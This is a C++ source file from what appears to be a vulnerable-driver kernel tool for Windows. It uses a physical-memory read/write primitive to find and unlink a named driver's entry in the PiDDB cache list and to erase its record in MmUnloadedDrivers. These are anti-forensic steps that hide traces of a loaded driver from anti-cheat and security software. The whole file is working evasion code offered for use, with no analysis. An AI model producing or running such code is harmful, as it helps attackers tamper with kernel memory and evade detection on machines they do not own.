#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"
#include "cleanup.h"

static ULONG64 ReadKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return 0;
    return PhysRead64(device, sc, pa);
}

static bool WriteKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va, ULONG64 value) {
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return false;
    return PhysWrite64(device, sc, pa, value);
}

bool CleanPiDDBCache(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* driverFileName
) {
    printf("[*] Cleaning PiDDB...\n");

    ULONG64 listHeadVA = offsets->NtoskrnlBase + offsets->PiDDBCacheList;
    ULONG64 currentVA = ReadKernelPtr(device, sc, systemCr3, listHeadVA);

    if (!currentVA || currentVA == listHeadVA) {
        printf("[*] PiDDB empty\n");
        return true;
    }

    int checked = 0;
    while (currentVA != listHeadVA && currentVA != 0 && checked < 256) {
        checked++;

        ULONG64 nameStructVA = currentVA + 0x10;
        ULONG64 nameLenPA = VirtToPhys(device, sc, systemCr3, nameStructVA);
        if (!nameLenPA) goto next;

        {
            USHORT nameLen = (USHORT)PhysRead32(device, sc, nameLenPA);
            if (nameLen == 0 || nameLen > 512) goto next;

            ULONG64 nameBufVA = ReadKernelPtr(device, sc, systemCr3, nameStructVA + 0x08);
            if (!nameBufVA) goto next;

            wchar_t name[128] = {};
            ULONG readLen = nameLen < sizeof(name) - 2 ? nameLen : sizeof(name) - 2;
            ULONG64 nameBufPA = VirtToPhys(device, sc, systemCr3, nameBufVA);
            if (!nameBufPA) goto next;
            PhysReadBuffer(device, sc, nameBufPA, name, readLen);

            if (_wcsicmp(name, driverFileName) == 0) {
                ULONG64 flink = ReadKernelPtr(device, sc, systemCr3, currentVA);
                ULONG64 blink = ReadKernelPtr(device, sc, systemCr3, currentVA + 0x08);

                if (flink && blink) {
                    WriteKernelPtr(device, sc, systemCr3, blink, flink);
                    WriteKernelPtr(device, sc, systemCr3, flink + 0x08, blink);
                    WriteKernelPtr(device, sc, systemCr3, currentVA, currentVA);
                    WriteKernelPtr(device, sc, systemCr3, currentVA + 0x08, currentVA);
                }

                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x20, 0);
                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x10, 0);

                printf("[+] PiDDB entry cleaned\n");
                return true;
            }
        }

    next:
        currentVA = ReadKernelPtr(device, sc, systemCr3, currentVA);
    }

    printf("[*] PiDDB entry not found\n");
    return true;
}

bool PrepareMmCleanup(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    MmCleanupContext* ctx
) {
    memset(ctx, 0, sizeof(*ctx));

    ULONG64 mmUnloadedVA = offsets->NtoskrnlBase + offsets->MmUnloadedDrivers;
    ULONG64 driversArrayVA = ReadKernelPtr(device, sc, systemCr3, mmUnloadedVA);
    if (!driversArrayVA) return false;

    ULONG64 lastIndexVA = offsets->NtoskrnlBase + offsets->MmLastUnloadedDriver;
    ULONG64 lastIndexPA = VirtToPhys(device, sc, systemCr3, lastIndexVA);
    if (!lastIndexPA) return false;

    ctx->preUnloadIndex = PhysRead32(device, sc, lastIndexPA);

    ULONG entryIndex = ctx->preUnloadIndex % 50;
    ULONG64 entryVA = driversArrayVA + (ULONG64)entryIndex * 0x28;
    ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
    if (!entryPA) return false;

    ULONG64 entryPageBase = entryPA & ~0xFFFULL;
    ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
    ctx->driversArrayPA = entryPA;

    // pre-map pages — mappings survive driver unload
    ctx->mappedDriversPage = PhysMap(device, sc, entryPageBase, 0x1000);
    if (!ctx->mappedDriversPage) return false;

    ULONG64 indexPageBase = lastIndexPA & ~0xFFFULL;
    ctx->indexOffsetInPage = (ULONG)(lastIndexPA & 0xFFF);
    ctx->indexPA = lastIndexPA;

    ctx->mappedIndexPage = PhysMap(device, sc, indexPageBase, 0x1000);
    if (!ctx->mappedIndexPage) return false;

    printf("[+] MmUnloadedDrivers pages pre-mapped\n");
    return true;
}

bool FinishMmCleanup(MmCleanupContext* ctx) {
    if (!ctx->mappedDriversPage || !ctx->mappedIndexPage) return false;

    BYTE* entryPtr = (BYTE*)ctx->mappedDriversPage + ctx->offsetInPage;
    memset(entryPtr, 0, 0x28);

    ULONG* indexPtr = (ULONG*)((BYTE*)ctx->mappedIndexPage + ctx->indexOffsetInPage);
    ULONG cur = *indexPtr;
    *indexPtr = cur > 0 ? cur - 1 : 49;

    printf("[+] MmUnloadedDrivers cleaned\n");
    return true;
}
